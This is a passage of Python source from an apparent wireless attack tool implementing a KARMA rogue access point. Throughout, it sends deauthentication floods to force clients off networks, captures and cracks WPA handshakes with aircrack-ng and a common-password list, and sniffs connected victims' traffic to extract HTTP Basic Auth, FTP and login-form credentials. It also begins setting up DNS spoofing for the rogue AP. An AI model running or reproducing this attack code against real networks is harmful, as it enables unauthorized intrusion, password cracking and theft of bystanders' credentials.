                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                            if mac_match:
                                return mac_match.group(1).lower()
            except Exception:
                pass
            
            # Method 4: Try to get from ifconfig
            try:
                cmd = ['ifconfig', self.rogue_interface]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'HWaddr' in line or 'ether' in line:
                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                            if mac_match:
                                return mac_match.group(1).lower()
            except Exception:
                pass
            
            return None
            
        except Exception:
            return None
    
    def retry_handshake_capture(self, client_mac):
        """Retry handshake capture for a client after a delay"""
        try:
            # Wait 30 seconds before retry
            time.sleep(30)
            
            # Check if client is still connected
            if client_mac in self.connected_clients and client_mac not in self.captured_handshakes:
                Color.pl('{+} {C}Retrying handshake capture for {G}%s{W}...' % client_mac)
                
                # Retry with more aggressive deauth
                rogue_bssid = self._get_rogue_ap_bssid()
                if rogue_bssid:
                    # Send more deauth packets to force reconnection
                    deauth_cmd = [
                        'aireplay-ng',
                        '-0', '10',  # Send 10 deauth packets
                        '--ignore-negative-one',
                        '-a', rogue_bssid,
                        '-c', client_mac,
                        self.probe_interface
                    ]
                    
                    try:
                        process = subprocess.Popen(deauth_cmd, 
                                                 stdout=subprocess.DEVNULL, 
                                                 stderr=subprocess.DEVNULL,
                                                 preexec_fn=os.setsid)
                        process.wait(timeout=10)
                    except subprocess.TimeoutExpired:
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                        except:
                            pass
                        process.kill()
                    
                    # Wait for reconnection
                    time.sleep(5)
                    
                    # Try handshake capture again
                    self.capture_handshake_for_client(client_mac)
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in retry handshake capture: {O}%s{W}' % str(e))
    
    def validate_handshake_async(self, capfile):
        """Validate handshake asynchronously to prevent blocking - Fixed implementation"""
        try:
            if not os.path.exists(capfile):
                return False
                
            # Use aircrack-ng to validate handshake (more reliable)
            cmd = ['aircrack-ng', '-J', '/tmp/test_handshake', capfile]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
            
            # Check if aircrack-ng found a valid handshake
            if result.returncode == 0 and '1 handshake' in result.stdout:
                return True
            
            # Fallback: Use tshark to check for EAPOL frames
            cmd = ['tshark', '-r', capfile, '-T', 'fields', '-e', 'wlan.fc.type_subtype', '-e', 'eapol.type']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                eapol_count = 0
                for line in lines:
                    if line.strip() and ('0x8' in line or 'eapol' in line.lower()):
                        eapol_count += 1
                
                # Need at least 4 EAPOL frames for complete handshake
                return eapol_count >= 4
            
            return False
            
        except subprocess.TimeoutExpired:
            if Configuration.verbose > 1:
                Color.pl('{!} {O}Handshake validation timeout for {C}%s{W}' % capfile)
            return False
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error validating handshake: {O}%s{W}' % str(e))
            return False
    
    def get_ap_bssid_for_client(self, client_mac):
        """Get the REAL AP BSSID that the client is trying to connect to (for handshake capture)"""
        try:
            # In KARMA, client probes reveal which real AP they want to connect to
            # Check the client's probe requests to find their preferred network
            if hasattr(self, 'client_probes') and client_mac in self.client_probes:
                for ssid in self.client_probes[client_mac]:
                    # Find this SSID in real_networks
                    if hasattr(self, 'real_networks') and self.real_networks:
                        for network in self.real_networks:
                            if hasattr(network, 'essid') and network.essid == ssid:
                                Color.pl('{+} {C}Client {G}%s{W} wants to connect to {G}%s{W} (BSSID: {G}%s{W})' % 
                                        (client_mac, ssid, network.bssid))
                                return network.bssid
            
            # Fallback: check real networks for any client matching this MAC
            if hasattr(self, 'real_networks') and self.real_networks:
                for network in self.real_networks:
                    if hasattr(network, 'clients'):
                        for client in network.clients:
                            if client.station == client_mac:
                                Color.pl('{+} {C}Found client {G}%s{W} on network {G}%s{W}' % 
                                        (client_mac, network.bssid))
                                return network.bssid
            
            # KARMA: If client is connected to rogue AP, use rogue AP BSSID
            # This allows capturing handshakes from clients connecting to our fake AP
            if hasattr(self, 'rogue_ap_process') and self.rogue_ap_process and self.rogue_interface:
                # Try to get the rogue AP BSSID from hostapd
                try:
                    rogue_iface = self.rogue_interface  # Store in local variable for type safety
                    result = subprocess.run(['ip', 'link', 'show', rogue_iface], 
                                          capture_output=True, text=True, timeout=3)
                    if result.returncode == 0 and 'ether' in result.stdout:
                        # Extract MAC address from ip link output
                        for line in result.stdout.split('\n'):
                            if 'ether' in line:
                                parts = line.split()
                                for i, part in enumerate(parts):
                                    if part == 'ether' and i + 1 < len(parts):
                                        rogue_bssid = parts[i + 1]
                                        Color.pl('{+} {C}Using rogue AP BSSID {G}%s{W} for client {G}%s{W}' % 
                                                (rogue_bssid, client_mac))
                                        return rogue_bssid
                except Exception as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {O}Could not get rogue AP BSSID: {O}%s{W}' % str(e))
            
            # Last resort: scan for APs with this client
            ap_bssid = self.scan_for_ap_with_client(client_mac)
            if ap_bssid:
                Color.pl('{+} {C}Scanned and found AP {G}%s{W} for client {G}%s{W}' % (ap_bssid, client_mac))
            return ap_bssid
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error getting AP BSSID for client: {O}%s{W}' % str(e))
            return None
    
    def scan_for_ap_with_client(self, client_mac):
        """Scan for APs that have the specified client"""
        try:
            # Quick scan to find APs with this client
            cmd = ['airodump-ng', self.probe_interface, '--bssid', client_mac, '--write', '/tmp/scan_temp', '--output-format', 'csv']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            # Parse output to find AP BSSID
            lines = result.stdout.split('\n')
            for line in lines:
                if client_mac in line and ',' in line:
                    parts = line.split(',')
                    if len(parts) > 1:
                        return parts[0].strip()
            
            return None
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error scanning for AP with client: {O}%s{W}' % str(e))
            return None
    
    def trigger_handshake_with_deauth(self, ap_bssid, client_mac):
        """Send deauth frames to trigger handshake - Enhanced implementation"""
        try:
            Color.pl('{+} {C}Sending deauth to trigger handshake: AP {G}%s{W} -> Client {G}%s{W}' % (ap_bssid, client_mac))
            
            # Send more aggressive deauth packets for better success rate
            deauth_cmd = [
                'aireplay-ng', 
                '-0', '8',  # Increased from 5 to 8 packets for better success
                '--ignore-negative-one',  # Ignore negative one errors
                '-a', ap_bssid, 
                '-c', client_mac, 
                self.probe_interface
            ]
            
            result = subprocess.run(deauth_cmd, capture_output=True, timeout=8)
            if result.returncode != 0 and Configuration.verbose > 1:
                Color.pl('{!} {R}Deauth command failed: {O}%s{W}' % result.stderr.decode())
            
            # Small delay to let deauth take effect
            time.sleep(2)
            
            # Send deauth from client to AP (reverse direction) - more aggressive
            deauth_cmd_reverse = [
                'aireplay-ng', 
                '-0', '5',  # Increased from 3 to 5 packets
                '--ignore-negative-one',
                '-a', ap_bssid, 
                '-c', client_mac, 
                self.probe_interface
            ]
            
            result = subprocess.run(deauth_cmd_reverse, capture_output=True, timeout=8)
            if result.returncode != 0 and Configuration.verbose > 1:
                Color.pl('{!} {R}Reverse deauth command failed: {O}%s{W}' % result.stderr.decode())
            
            # Additional broadcast deauth for better coverage
            broadcast_deauth = [
                'aireplay-ng',
                '-0', '3',
                '--ignore-negative-one',
                '-a', ap_bssid,
                self.probe_interface
            ]
            
            result = subprocess.run(broadcast_deauth, capture_output=True, timeout=5)
            if result.returncode != 0 and Configuration.verbose > 1:
                Color.pl('{!} {R}Broadcast deauth command failed: {O}%s{W}' % result.stderr.decode())
            
            Color.pl('{+} {G}Deauth frames sent successfully{W}')
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error sending deauth frames: {O}%s{W}' % str(e))
    
    def crack_handshake_async(self, client_mac, handshake_file):
        """Attempt to crack captured WPA handshake asynchronously"""
        # Check if handshake cracking is enabled (separate from capture)
        if not getattr(Configuration, 'karma_handshake_cracking', False):
            Color.pl('{+} {C}Handshake cracking disabled - skipping password attempt (capture only){W}')
            return
            
        try:
            # Start cracking in background thread
            crack_thread = threading.Thread(
                target=self._crack_handshake_worker,
                args=(client_mac, handshake_file),
                name=f'crack_handshake_{client_mac.replace(":", "")}'
            )
            crack_thread.daemon = True
            crack_thread.start()
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error starting async handshake cracking: {O}%s{W}' % str(e))
    
    def _crack_handshake_worker(self, client_mac, handshake_file):
        """Worker thread for handshake cracking"""
        try:
            Color.pl('{+} {C}Starting background cracking for {G}%s{W}...' % client_mac)
            
            # Try common passwords first
            common_passwords = [
                '12345678', 'password', 'admin', '1234567890',
                'qwerty123', 'password123', '123456789', 'admin123',
                'welcome', '12345', '123456', 'password1'
            ]
            
            for password in common_passwords:
                if not self.running:  # Check if attack is still running
                    break
                    
                if self.try_password_async(handshake_file, password):
                    self.cracked_passwords[client_mac] = password
                    Color.pl('{+} {G}PASSWORD CRACKED for {C}%s{W}: {R}%s{W}' % (client_mac, password))
                    
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'Password Cracked', f'{client_mac}: {password}')
                    return True
            
            # Try wordlist if available
            wordlist_file = getattr(Configuration, 'wordlist', None)
            if wordlist_file and os.path.exists(wordlist_file) and self.running:
                Color.pl('{+} {C}Trying wordlist attack for {G}%s{W}...' % client_mac)
                if self.try_wordlist_attack_async(handshake_file, wordlist_file):
                    Color.pl('{+} {G}Password found in wordlist for {C}%s{W}' % client_mac)
                    return True
            
            Color.pl('{!} {R}Could not crack password for {O}%s{W}' % client_mac)
            return False
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in handshake cracking worker: {O}%s{W}' % str(e))
            return False
    
    def try_password_async(self, handshake_file, password):
        """Try a specific password against handshake asynchronously"""
        try:
            cmd = ['aircrack-ng', '-w', '-', handshake_file]
            result = subprocess.run(cmd, input=password, capture_output=True, text=True, timeout=10)
            
            return 'KEY FOUND!' in result.stdout
            
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False
    
    def try_wordlist_attack_async(self, handshake_file, wordlist_file):
        """Try wordlist attack against handshake asynchronously"""
        try:
            cmd = ['aircrack-ng', '-w', wordlist_file, handshake_file]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if 'KEY FOUND!' in result.stdout:
                # Extract password from output
                lines = result.stdout.split('\n')
                for line in lines:
                    if 'KEY FOUND!' in line:
                        parts = line.split()
                        if len(parts) > 2:
                            password = parts[-1]
                            return password
            return False
            
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False
    
    def cleanup_completed_capture_threads(self):
        """Clean up completed capture threads - Thread-safe implementation"""
        try:
            with self._capture_lock:
                completed_clients = []
                for client_mac, thread_info in self.active_capture_threads.items():
                    if thread_info['status'] == 'completed' or not thread_info['thread'].is_alive():
                        completed_clients.append(client_mac)
                
                for client_mac in completed_clients:
                    del self.active_capture_threads[client_mac]
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error cleaning up capture threads: {O}%s{W}' % str(e))
    
    def cleanup_all_capture_threads(self):
        """Clean up all active capture threads - Thread-safe implementation"""
        try:
            with self._capture_lock:
                threads_to_cleanup = list(self.active_capture_threads.items())
                self.active_capture_threads.clear()
            
            # Clean up threads outside of lock to avoid deadlock
            for client_mac, thread_info in threads_to_cleanup:
                try:
                    if thread_info['thread'].is_alive():
                        # Thread is still running, wait briefly for completion
                        thread_info['thread'].join(timeout=2)
                except Exception:
                    pass
                    
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error cleaning up all capture threads: {O}%s{W}' % str(e))
    
    def crack_handshake(self, client_mac, handshake_file):
        """Legacy method - redirects to async implementation"""
        self.crack_handshake_async(client_mac, handshake_file)
    
    def try_password(self, handshake_file, password):
        """Legacy method - redirects to async implementation"""
        return self.try_password_async(handshake_file, password)
    
    def try_wordlist_attack(self, handshake_file, wordlist_file):
        """Legacy method - redirects to async implementation"""
        return self.try_wordlist_attack_async(handshake_file, wordlist_file)
    
    def add_rogue_ap_network(self, bssid, essid, clients=None):
        """Add a rogue AP network to tracking"""
        try:
            network_info = {
                'bssid': bssid,
                'essid': essid,
                'clients': clients or [],
                'created_time': time.time()
            }
            
            # Check if network already exists
            for i, existing_network in enumerate(self.rogue_ap_networks):
                if existing_network['bssid'] == bssid:
                    # Update existing network
                    self.rogue_ap_networks[i] = network_info
                    return
            
            # Add new network
            self.rogue_ap_networks.append(network_info)
            Color.pl('{+} {C}Added rogue AP network: {G}%s{W} ({C}%s{W})' % (essid, bssid))
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error adding rogue AP network: {O}%s{W}' % str(e))
    
    def update_rogue_ap_clients(self, bssid, clients):
        """Update clients for a rogue AP network"""
        try:
            for network in self.rogue_ap_networks:
                if network['bssid'] == bssid:
                    network['clients'] = clients
                    return True
            return False
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error updating rogue AP clients: {O}%s{W}' % str(e))
            return False
    
    def monitor_credential_harvesting(self):
        try:
            # Check if credential harvesting is enabled
            if not getattr(Configuration, 'karma_credential_harvesting', True):
                Color.pl('{!} {O}Credential harvesting disabled in configuration{W}')
                return
            
            Color.pl('{+} {C}Credential harvesting monitor started{W}')
            
            while self.running:
                if self.connected_clients:
                    for client_mac in self.connected_clients:
                        if client_mac not in self.harvested_credentials:
                            self.harvest_credentials_from_client(client_mac)
                
                time.sleep(5)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error in credential harvesting: {O}%s{W}' % str(e))
    
    def harvest_credentials_from_client(self, client_mac):
        """Harvest credentials from a specific client's traffic"""
        try:
            Color.pl('{+} {C}Harvesting credentials from {G}%s{W}...' % client_mac)
            
            # FIXED: Capture on the rogue interface (where AP traffic flows) without BSSID filter
            # This captures all traffic on the AP interface, including data frames for credential harvesting
            with Airodump(interface=self.rogue_interface,
                         target_bssid=None,  # Capture all traffic, not filtered by BSSID
                         output_file_prefix='karma_credentials_%s' % client_mac.replace(':', ''),
                         delete_existing_files=True) as airodump:
                
                # Monitor for 30 seconds
                timer = Timer(30)
                credentials_found = []
                
                while not timer.ended() and self.running:
                    cap_files = airodump.find_files(endswith='.cap')
                    if cap_files:
                        # Analyze captured traffic for credentials
                        credentials = self.analyze_traffic_for_credentials(cap_files[0])
                        if credentials:
                            credentials_found.extend(credentials)
                    
                    time.sleep(5)
                
                if credentials_found:
                    self.harvested_credentials[client_mac] = credentials_found
                    Color.pl('{+} {G}Credentials harvested from {C}%s{W}:{W}' % client_mac)
                    for cred in credentials_found:
                        Color.pl('  {G}* {W}%s{W}' % cred)
                    
                    # Save credential data to permanent directory
                    cap_files = airodump.find_files(endswith='.cap')
                    if cap_files:
                        self.save_credential_data(cap_files[0], client_mac, credentials_found)
                        
                    if hasattr(self, 'target') and self.target:
                        Color.pattack('KARMA', self.target, 'Credentials Harvested', f'{client_mac}: {len(credentials_found)} credentials')
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error harvesting credentials: {O}%s{W}' % str(e))
    
    def capture_client_traffic(self, client_mac):
        """Capture general traffic from a connected client"""
        try:
            # Check if traffic capture is enabled
            if not getattr(Configuration, 'karma_traffic_capture', True):
                if Configuration.verbose > 1:
                    Color.pl('{!} {O}Traffic capture disabled in configuration{W}')
                return
            
            Color.pl('{+} {C}Capturing traffic from {G}%s{W}...' % client_mac)
            
            # FIXED: Capture on the rogue interface (where AP traffic flows) without BSSID filter
            # This captures all traffic on the AP interface, including data frames
            with Airodump(interface=self.rogue_interface,
                         target_bssid=None,  # Capture all traffic, not filtered by BSSID
                         output_file_prefix='karma_traffic_%s' % client_mac.replace(':', ''),
                         delete_existing_files=True) as airodump:
                
                # Monitor for 60 seconds to capture general traffic
                timer = Timer(60)
                
                while not timer.ended() and self.running:
                    time.sleep(10)  # Check every 10 seconds
                
                # Save traffic capture to permanent directory
                cap_files = airodump.find_files(endswith='.cap')
                if cap_files:
                    self.save_traffic_capture(cap_files[0], client_mac)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error capturing client traffic: {O}%s{W}' % str(e))
    
    def analyze_traffic_for_credentials(self, capfile):
        """Enhanced traffic analysis for credentials and sensitive data"""
        try:
            credentials = []
            
            # Check if file exists and is accessible
            if not os.path.exists(capfile) or not os.access(capfile, os.R_OK):
                Color.pl('{!} {R}PCAP file not accessible: {O}%s{W}' % capfile)
                return credentials
            
            # Look for HTTP POST requests (login forms) - Enhanced
            http_cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'http.request.method == POST',
                '-T', 'fields',
                '-e', 'frame.time',
                '-e', 'ip.src',
                '-e', 'ip.dst',
                '-e', 'http.host',
                '-e', 'http.request.uri',
                '-e', 'http.file_data'
            ]
            
            result = subprocess.run(http_cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0 and result.stdout.strip():
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip():
                        parts = line.split('\t')
                        if len(parts) >= 6:
                            timestamp = parts[0]
                            src_ip = parts[1]
                            dst_ip = parts[2]
                            host = parts[3]
                            uri = parts[4]
                            data = parts[5] if len(parts) > 5 else ''
                            
                            # Enhanced credential detection
                            cred_info = self.extract_credentials_from_data(data, host, uri, timestamp, src_ip)
                            if cred_info:
                                credentials.append(cred_info)
            
            # Look for HTTP Basic Auth - Enhanced
            basic_auth_cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'http.authorization',
                '-T', 'fields',
                '-e', 'frame.time',
                '-e', 'ip.src',
                '-e', 'http.host',
                '-e', 'http.authorization'
            ]
            
            result = subprocess.run(basic_auth_cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0 and result.stdout.strip():
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip():
                        parts = line.split('\t')
                        if len(parts) >= 4:
                            timestamp = parts[0]
                            src_ip = parts[1]
                            host = parts[2]
                            auth = parts[3]
                            
                            # Decode Basic Auth
                            if auth.startswith('Basic '):
                                try:
                                    import base64
                                    decoded = base64.b64decode(auth[6:]).decode('utf-8')
                                    if ':' in decoded:
                                        username, password = decoded.split(':', 1)
                                        cred_info = f"Basic Auth: {host} - User: {username}, Pass: {password[:10]}..."
                                        credentials.append(cred_info)
                                except Exception:
                                    pass
            
            # Look for FTP credentials
            ftp_cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'ftp.request.command == USER or ftp.request.command == PASS',
                '-T', 'fields',
                '-e', 'frame.time',
                '-e', 'ip.src',
                '-e', 'ftp.request.command',
                '-e', 'ftp.request.arg'
            ]
            
            result = subprocess.run(ftp_cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0 and result.stdout.strip():
                ftp_creds = {}
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip():
                        parts = line.split('\t')
                        if len(parts) >= 4:
                            timestamp = parts[0]
                            src_ip = parts[1]
                            command = parts[2]
                            arg = parts[3]
                            
                            if command == 'USER':
                                ftp_creds[src_ip] = {'user': arg, 'pass': None}
                            elif command == 'PASS' and src_ip in ftp_creds:
                                ftp_creds[src_ip]['pass'] = arg
                                cred_info = f"FTP Login: {src_ip} - User: {ftp_creds[src_ip]['user']}, Pass: {arg[:10]}..."
                                credentials.append(cred_info)
            
            # Look for DNS queries (potential data exfiltration)
            dns_cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'dns.flags.response == 0',
                '-T', 'fields',
                '-e', 'frame.time',
                '-e', 'ip.src',
                '-e', 'dns.qry.name'
            ]
            
            result = subprocess.run(dns_cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0 and result.stdout.strip():
                suspicious_domains = []
                lines = result.stdout.split('\n')
                for line in lines:
                    if line.strip():
                        parts = line.split('\t')
                        if len(parts) >= 3:
                            timestamp = parts[0]
                            src_ip = parts[1]
                            domain = parts[2]
                            
                            # Check for suspicious domains
                            if self.is_suspicious_domain(domain):
                                suspicious_domains.append(f"Suspicious DNS: {src_ip} -> {domain}")
                
                if suspicious_domains:
                    credentials.extend(suspicious_domains[:5])  # Limit to 5 most suspicious
            
            return credentials
            
        except Exception as e:
            Color.pl('{!} {R}Error analyzing traffic: {O}%s{W}' % str(e))
            return []
    
    def extract_credentials_from_data(self, data, host, uri, timestamp, src_ip):
        """Extract credentials from HTTP POST data"""
        try:
            if not data:
                return None
            
            data_lower = data.lower()
            cred_info = None
            
            # Look for common login form fields
            if any(field in data_lower for field in ['password', 'passwd', 'pwd', 'login', 'username', 'user']):
                cred_info = f"Login Form: {host}{uri} from {src_ip}"
                
                # Try to extract actual values
                if 'username=' in data_lower or 'user=' in data_lower:
                    cred_info += " (Username field found)"
                if 'password=' in data_lower or 'passwd=' in data_lower:
                    cred_info += " (Password field found)"
                
                # Look for email patterns
                import re
                email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                emails = re.findall(email_pattern, data)
                if emails:
                    cred_info += f" (Email: {emails[0]})"
            
            return cred_info
            
        except Exception:
            return None
    
    def is_suspicious_domain(self, domain):
        """Check if a domain is suspicious for data exfiltration"""
        try:
            suspicious_keywords = [
                'exfil', 'steal', 'leak', 'dump', 'backup', 'data',
                'secret', 'private', 'confidential', 'internal'
            ]
            
            domain_lower = domain.lower()
            return any(keyword in domain_lower for keyword in suspicious_keywords)
            
        except Exception:
            return False
    
    def start_live_monitoring(self, interface=None):
        """Start live monitoring with Wireshark integration"""
        try:
            monitor_interface = interface or self.probe_interface
            if not monitor_interface:
                Color.pl('{!} {R}No interface available for live monitoring{W}')
                return False
            
            Color.pl('{+} {G}Starting live monitoring on interface {C}%s{W}...' % monitor_interface)
            
            # Use configured live monitoring directory
            live_dir = Configuration.karma_live_monitoring_dir
            if not os.path.exists(live_dir):
                os.makedirs(live_dir, exist_ok=True)
            
            # Start continuous capture with tshark
            timestamp = time.strftime('%Y%m%d_%H%M%S')
            live_cap_file = os.path.join(live_dir, f'live_monitoring_{timestamp}.pcap')
            
            # Start tshark in background for live capture
            tshark_cmd = [
                'tshark',
                '-i', monitor_interface,
                '-w', live_cap_file,
                '-f', 'wlan',  # Capture only wireless traffic
                '-b', 'filesize:10000',  # Rotate files every 10MB
                '-b', 'files:10'  # Keep only 10 files
            ]
            
            self.live_monitor_process = subprocess.Popen(
                tshark_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            Color.pl('{+} {G}Live monitoring started: {C}%s{W}' % live_cap_file)
            Color.pl('{+} {C}You can open this file in Wireshark for real-time analysis{W}')
            
            # Start real-time analysis thread
            self.live_analysis_thread = threading.Thread(
                target=self.real_time_traffic_analysis,
                args=(live_cap_file,),
                name='live_analysis'
            )
            self.live_analysis_thread.daemon = True
            self.live_analysis_thread.start()
            
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error starting live monitoring: {O}%s{W}' % str(e))
            return False
    
    def stop_live_monitoring(self):
        """Stop live monitoring"""
        try:
            if hasattr(self, 'live_monitor_process') and self.live_monitor_process:
                self.live_monitor_process.terminate()
                self.live_monitor_process.wait(timeout=5)
                Color.pl('{+} {G}Live monitoring stopped{W}')
            
            if hasattr(self, 'live_analysis_thread') and self.live_analysis_thread.is_alive():
                # The thread will stop when self.running becomes False
                pass
                
        except Exception as e:
            Color.pl('{!} {R}Error stopping live monitoring: {O}%s{W}' % str(e))
    
    def real_time_traffic_analysis(self, capfile):
        """Real-time traffic analysis for live monitoring"""
        try:
            Color.pl('{+} {C}Starting real-time traffic analysis...{W}')
            last_size = 0
            
            while self.running:
                try:
                    # Check if file exists and has grown
                    if os.path.exists(capfile):
                        current_size = os.path.getsize(capfile)
                        if current_size > last_size and current_size > 1024:  # At least 1KB
                            
                            # Analyze new traffic
                            credentials = self.analyze_traffic_for_credentials(capfile)
                            if credentials:
                                Color.pl('{+} {G}Real-time credentials detected:{W}')
                                for cred in credentials[:3]:  # Show only first 3
                                    Color.pl('  {G}* {W}%s{W}' % cred)
                            
                            # Check for new clients
                            new_clients = self.detect_new_clients(capfile)
                            if new_clients:
                                Color.pl('{+} {C}New clients detected:{W}')
                                for client in new_clients:
                                    Color.pl('  {C}* {W}%s{W}' % client)
                            
                            last_size = current_size
                    
                    time.sleep(10)  # Check every 10 seconds
                    
                except Exception as e:
                    if Configuration.verbose > 1:
                        Color.pl('{!} {R}Error in real-time analysis: {O}%s{W}' % str(e))
                    time.sleep(5)
            
        except Exception as e:
            Color.pl('{!} {R}Error in real-time traffic analysis: {O}%s{W}' % str(e))
    
    def detect_new_clients(self, capfile):
        """Detect new clients from captured traffic"""
        try:
            new_clients = []
            
            # Look for probe requests (new clients scanning)
            probe_cmd = [
                'tshark',
                '-r', capfile,
                '-Y', 'wlan.fc.type_subtype == 0x04',  # Probe request
                '-T', 'fields',
                '-e', 'wlan.sa'  # Source MAC
            ]
            
            result = subprocess.run(probe_cmd, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if line.strip():
                        client_mac = line.strip()
                        if client_mac not in self.connected_clients and client_mac not in self.client_probes:
                            new_clients.append(client_mac)
            
            return new_clients[:5]  # Return max 5 new clients
            
        except Exception:
            return []
    
    
    def show_attack_status(self):
        """Show comprehensive attack status"""
        try:
            if self.connected_clients or self.captured_handshakes or self.cracked_passwords or self.harvested_credentials:
                Color.clear_entire_line()
                
                status_parts = []
                if self.connected_clients:
                    status_parts.append(f"{len(self.connected_clients)} clients connected")
                if self.captured_handshakes:
                    status_parts.append(f"{len(self.captured_handshakes)} handshakes captured")
                if self.cracked_passwords:
                    status_parts.append(f"{len(self.cracked_passwords)} passwords cracked")
                if self.harvested_credentials:
                    status_parts.append(f"{len(self.harvested_credentials)} credentials harvested")
                
                status = " | ".join(status_parts)
                Color.p('{+} {G}Enhanced KARMA Active - {C}%s{W}' % status)
                
                # GUI logging
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Status', status)
                
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error showing status: {O}%s{W}' % str(e))
    
    def decode_hex_ssid(self, ssid):
        """Convert hex-encoded SSID to readable text"""
        try:
            # Check if SSID is hex-encoded (contains only hex characters)
            if len(ssid) > 0 and all(c in '0123456789abcdefABCDEF' for c in ssid):
                # Try to decode as hex
                try:
                    decoded = bytes.fromhex(ssid).decode('utf-8', errors='ignore')
                    if decoded and decoded.isprintable():
                        return decoded
                except:
                    pass
            
            # Return original SSID if not hex or decoding failed
            return ssid
            
        except Exception:
            return ssid
    
    def setup_rogue_ap(self):
        """Setup rogue access point infrastructure"""
        Color.pl('\n{+} {C}Phase 2: Setting up rogue AP infrastructure{W}')
        
        try:
            # Create hostapd configuration
            if hasattr(self, 'target') and self.target:
                Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Creating hostapd config')
            if not self.create_hostapd_config():
                return False
            
            # Setup DHCP server (dnsmasq) - only if DNS spoofing is enabled
            dns_spoofing_enabled = getattr(Configuration, 'karma_dns_spoofing', False)  # Changed default from True to False
            self.dns_spoofing_enabled = dns_spoofing_enabled  # Store for cleanup
            
            # Debug: Log current Configuration values
            Color.pl('{+} {C}KARMA Configuration Debug:{W}')
            Color.pl('{+} {C}  karma_dns_spoofing: {G}%s{W}' % getattr(Configuration, 'karma_dns_spoofing', 'NOT SET'))
            Color.pl('{+} {C}  karma_probe_timeout: {G}%s{W}' % getattr(Configuration, 'karma_probe_timeout', 'NOT SET'))
            Color.pl('{+} {C}  karma_min_probes: {G}%s{W}' % getattr(Configuration, 'karma_min_probes', 'NOT SET'))
            Color.pl('{+} {C}  karma_capture_all_channels: {G}%s{W}' % getattr(Configuration, 'karma_capture_all_channels', 'NOT SET'))
            
            if dns_spoofing_enabled:
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Setting up DHCP server')
                if not self.setup_dhcp_server():
                    return False
                
                # Setup DNS redirection
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Setting up DNS redirection')
                if not self.setup_dns_redirection():
                    return False
            else:
                Color.pl('{+} {O}DNS spoofing disabled - running Layer 2 KARMA only{W}')
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'DNS spoofing disabled - Layer 2 only')
            
            # Setup internet access if enabled
            if getattr(Configuration, 'karma_internet_access', False):
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Setting up internet access')
                if not self.setup_internet_access():
                    Color.pl('{!} {R}Failed to setup internet access - continuing without{W}')
            else:
                Color.pl('{+} {O}Internet access disabled - victims will have no internet connectivity{W}')
            
            # Reset rogue interface for AP mode (only if single interface mode)
            if self.single_interface_mode:
                if hasattr(self, 'target') and self.target:
                    Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Resetting interface for AP mode')
                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
                    Color.pl('{!} {R}Failed to reset rogue interface for AP mode{W}')
                    return False
            else:
                # Dual interface mode: Ensure rogue interface is in master mode for AP
